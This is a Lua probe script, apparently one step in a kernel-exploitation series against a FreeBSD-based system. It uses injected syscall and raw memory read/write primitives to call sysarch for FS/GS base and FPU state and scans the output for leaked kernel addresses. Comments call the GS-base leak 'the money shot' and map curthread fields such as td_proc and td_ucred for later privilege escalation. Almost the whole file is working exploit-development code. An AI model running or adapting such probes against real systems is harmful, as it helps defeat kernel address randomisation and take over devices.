-- CRASH_CLASS: LOW (GET is read-only), HIGH for SET
-- PROBE 43c: sysarch(165) via make_syscall — GS/FS base read
--
-- sysarch(AMD64_GET_GSBASE) reads the GS base register.
-- On FreeBSD, the kernel uses GS to access curthread — so the
-- GS base is a kernel thread pointer. If it leaks, we get a
-- direct kernel address.
--
-- AMD64_GET_FSBASE = 128
-- AMD64_GET_GSBASE = 129
-- AMD64_SET_FSBASE = 129 (same as GET_GSBASE — need to verify)
-- AMD64_SET_GSBASE = 130
--
-- Probe 42c already tested GET_FSBASE via sysarch and got 0x881068080
-- (userland TCB, not kernel). But GET_GSBASE was NOT tested.
-- The GS base is different from FS base and may point to kernel memory.

print("=== PROBE 43c: SYSARCH GS BASE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local sc_sysarch = make_syscall(165)

--------------------------------------------------------------------
-- A) GET_FSBASE (128) — control: should return userland TCB
--------------------------------------------------------------------
print("")
print("=== A: GET_FSBASE (128) ===")
do
    local buf = memory.alloc(16)
    safe_wq(buf, uint64(0))

    local ok, ret = pcall(function()
        return sc_sysarch(uint64(128), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rq(buf)
    local vh, vl = 0, 0
    if val then vh, vl = get_hi_lo(val) end
    print(string.format("  ret=%d  fsbase=%08X_%08X", rv, vh, vl))
    if vh >= 0xFFFF8000 then
        print("  *** KERNEL ADDRESS IN FSBASE ***")
    else
        print("  (userland — expected)")
    end
end

--------------------------------------------------------------------
-- B) GET_GSBASE (129) — the money shot
--------------------------------------------------------------------
print("")
print("=== B: GET_GSBASE (129) ===")
do
    local buf = memory.alloc(16)
    safe_wq(buf, uint64(0))

    local ok, ret = pcall(function()
        return sc_sysarch(uint64(129), uint64(buf))
    end)
    local rv = ok and to_num(ret) or -999
    local val = safe_rq(buf)
    local vh, vl = 0, 0
    if val then vh, vl = get_hi_lo(val) end
    print(string.format("  ret=%d  gsbase=%08X_%08X", rv, vh, vl))
    if vh >= 0xFFFF8000 then
        print("  *** KERNEL THREAD POINTER LEAKED ***")
        print("  GS base points to curthread in kernel memory")
        print("  From curthread: +0x0 = td_lock, +0x28 = td_proc,")
        print("  +0x40 = td_ucred, etc.")
    elseif rv == 0 and (vh > 0 or vl > 0) then
        print("  non-zero value — analyze further")
    else
        print("  zero or failed")
    end
end

--------------------------------------------------------------------
-- C) Try other sysarch ops (some may leak info)
-- i386_GET_IOPERM = 3, i386_GET_LDT = 1
-- AMD64_GET_XFPUSTATE = 132
--------------------------------------------------------------------
print("")
print("=== C: OTHER SYSARCH OPS ===")
do
    local buf = memory.alloc(0x100)
    local ops = {
        {num = 130, name = "AMD64_SET_GSBASE (skip — dangerous)"},
        {num = 131, name = "I386_GET_XFPUSTATE"},
        {num = 132, name = "AMD64_GET_XFPUSTATE"},
    }

    for _, op in ipairs(ops) do
        if op.num == 130 then
            print(string.format("  %d %s", op.num, op.name))
        else
            for off = 0, 0xFC, 4 do safe_wd(buf + off, 0) end
            -- For XFPUSTATE, arg is struct { void *addr; int len; }
            local xfpu_buf = memory.alloc(0x200)
            safe_wq(buf, uint64(xfpu_buf))
            safe_wd(buf + 8, 0x200)

            local ok, ret = pcall(function()
                return sc_sysarch(uint64(op.num), uint64(buf))
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  %d %s: ret=%d", op.num, op.name, rv))

            if rv == 0 then
                -- Dump first 64 bytes looking for kernel ptrs
                for off = 0, 56, 8 do
                    local q = safe_rq(xfpu_buf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 then
                            print(string.format("    +%02X: %08X_%08X KPTR!", off, h, l))
                        end
                    end
                end
            end
        end
    end
end

print("")
print("=== PROBE 43c COMPLETE ===")
